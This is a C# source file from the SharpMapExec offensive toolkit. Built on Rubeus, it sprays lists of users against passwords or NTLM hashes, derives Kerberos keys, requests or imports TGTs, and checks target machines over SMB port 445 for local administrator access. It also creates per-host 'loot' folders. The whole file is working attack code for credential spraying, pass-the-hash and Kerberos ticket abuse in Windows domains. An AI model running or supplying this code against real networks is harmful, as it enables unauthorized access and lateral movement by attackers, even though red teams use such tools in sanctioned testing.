using Rubeus;
using SharpMapExec.Helpers;
using System;
using System.Collections.Generic;
using System.IO;
using static Rubeus.Interop;

namespace SharpMapExec.Lib
{
    public class kerberossmb
    {
        public static void KerberosSmb(string[] users, string domain, string[] passwords, string[] hashes, string ticket, KERB_ETYPE encType, string dc, string[] computernames, string module, string moduleargument, List<string> flags)
        {
            StartJob(users, domain, passwords, hashes, ticket, encType, dc, computernames, module, moduleargument, flags);
            //var listOfTasks = new List<Task>();
            //listOfTasks.Add(new Task(() => StartJob(user, domain, hash, encType, outfile, ptt, dc, luid, describe, computernames, module, moduleargument)));
            //Tasks.StartAndWaitAllThrottled(listOfTasks, 1);
        }

        public static void StartJob(string[] users, string domain, string[] passwords, string[] hashes, string ticket, KERB_ETYPE encType, string dc, string[] computernames, string module, string moduleargument, List<string> flags)
        {
            string ticketoutput;
            if (String.IsNullOrEmpty(ticket))
            {
                foreach (string user in users)
                {
                    var secrets = hashes.Length > 0 ? hashes : passwords;
                    foreach (string secret in secrets)
                    {
                        string hash;
                        if (passwords.Length > 0)
                        {
                            string salt = String.Format("{0}{1}", domain.ToUpper(), user);
                            hash = Crypto.KerberosPasswordHash(encType, secret, salt);
                        }
                        else
                        {
                            hash = secret;
                        }
                        AToken.MakeToken("Fake", "Fake", "Fake");
                        Console.WriteLine("------------------");
                        Console.WriteLine(string.Format("[*] User:   {0}", user));
                        Console.WriteLine(string.Format("[*] domain: {0}", domain));
                        Console.WriteLine(string.Format("[*] secret: {0}", secret));
                        ticketoutput = SecurityContext.AskTicket(user, domain, hash, encType, dc);
                        if (ticketoutput.Contains("[+] Ticket successfully imported!"))
                            Console.WriteLine("[+] Ticket successfully imported!");
                        else
                        {
                            Console.WriteLine("[-] Could not request TGT");
                            continue;
                        }
                        Console.WriteLine();
                        foreach (string computername in computernames)
                        {
                            Console.WriteLine(String.Format("[*] Checking {0}", computername));
                            if (!Misc.CheckHostPort(computername, 445))
                            {
                                Console.WriteLine(String.Format("[-] Could Not Reach {0}:445", computername));
                                Console.WriteLine();
                                continue;
                            }
                            if (!Directory.Exists(Path.Combine("loot", computername)))
                            {
                                Directory.CreateDirectory(Path.Combine("loot", computername));
                            }
                            Smb.CheckLocalAdmin(computername, module);
                            Console.WriteLine("");
                        }
                        AToken.RevertFromToken();
                    }
                }
            }
            else
            {
                AToken.MakeToken("Fake", "Fake", "Fake");
                Console.WriteLine("------------------");
                Console.WriteLine(string.Format("[*] Ticket: {0}", ticket));
                ticketoutput = SecurityContext.ImportTicket(ticket);
                if (ticketoutput.Contains("[+] Ticket successfully imported!"))
                    Console.WriteLine("[+] TGT imported successfully!");
                else
                {
                    Console.WriteLine("[-] Could not import TGT");
                    return;
                }
                Console.WriteLine();
                foreach (string computername in computernames)
                {
                    Console.WriteLine(String.Format("[*] Checking {0}", computername));
                    if (!Misc.CheckHostPort(computername, 445))
                    {
                        Console.WriteLine(String.Format("[-] Could Not Reach {0}:445", computername));
                        Console.WriteLine();
                        continue;
                    }
                    if (!Directory.Exists(Path.Combine("loot", computername)))
                    {
                        Directory.CreateDirectory(Path.Combine("loot", computername));
                    }
                    Smb.CheckLocalAdmin(computername, module);
                    Console.WriteLine("");
                }
                AToken.RevertFromToken();
            }
        }
    }
}